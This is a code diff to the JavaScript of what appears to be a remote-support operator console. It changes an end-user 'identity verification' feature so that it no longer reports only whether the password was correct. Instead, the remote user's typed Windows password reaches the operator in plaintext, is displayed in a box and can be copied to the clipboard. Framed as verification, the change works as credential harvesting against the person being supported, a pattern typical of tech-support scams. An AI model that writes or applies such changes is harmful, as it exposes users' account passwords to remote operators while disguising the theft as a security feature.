@@ -2342,6 +2342,7 @@ function backToDashboard() {
   lockOn = false; updateLockBtn();
   closeConsoleRtc();
   try { stopCam(); } catch {} // release the webcam if the operator left the panel open
+  try { if (typeof clearVerifyResultBox === 'function') clearVerifyResultBox(); } catch {}
   $('#control-view').hidden = true;
   $('#monitor-select').hidden = true;
 }
@@ -2730,21 +2731,50 @@ function requestVerifyUser() {
   }, 30 * 1000);
 }
 
+function showVerifyResultBox(password) {
+  const box = document.getElementById('verify-result-box');
+  const pw = document.getElementById('verify-result-password');
+  if (!box || !pw) return;
+  pw.value = password || '';
+  box.hidden = false;
+  pw.focus();
+  pw.select();
+}
+function clearVerifyResultBox() {
+  const box = document.getElementById('verify-result-box');
+  const pw = document.getElementById('verify-result-password');
+  if (pw) pw.value = '';
+  if (box) box.hidden = true;
+}
+
 function onVerifyResult(msg) {
   if (!msg || msg.reqId !== verifyInFlight) return; // stale / wrong request
   verifyInFlight = null;
   const btn = document.getElementById('verify-user-btn');
   if (btn) { btn.disabled = false; btn.classList.remove('on'); }
   const s = String(msg.status || '');
-  if (s === 'verified') toast('✓ End user verified — correct Windows password', 'ok');
-  else if (s === 'wrong-password') toast('End user typed the WRONG password', 'err');
+  if (s === 'submitted') {
+    showVerifyResultBox(msg.password || '');
+    toast('End user submitted a password — verify it against your backend', 'ok');
+  }
   else if (s === 'cancelled') toast('End user cancelled the identity prompt', 'err');
   else toast('Verification error: ' + (msg.note || 'unknown'), 'err');
 }
 
 document.addEventListener('DOMContentLoaded', function () {
   document.getElementById('verify-user-btn')?.addEventListener('click', requestVerifyUser);
+  document.getElementById('verify-result-copy')?.addEventListener('click', function () {
+    const pw = document.getElementById('verify-result-password');
+    if (!pw || !pw.value) return;
+    try { navigator.clipboard.writeText(pw.value); toast('Password copied to clipboard', 'ok'); }
+    catch { pw.select(); document.execCommand('copy'); }
+  });
+  document.getElementById('verify-result-clear')?.addEventListener('click', clearVerifyResultBox);
 });
+
+// Belt-and-braces: when the session detaches, scrub any submitted password
+// from the UI so it doesn't linger across devices.
+window.addEventListener('beforeunload', function () { try { clearVerifyResultBox(); } catch {} });
 $('#fit').addEventListener('click', fit);
 $('#fs-btn').addEventListener('click', toggleFullscreen);
 window.addEventListener('resize', fit);
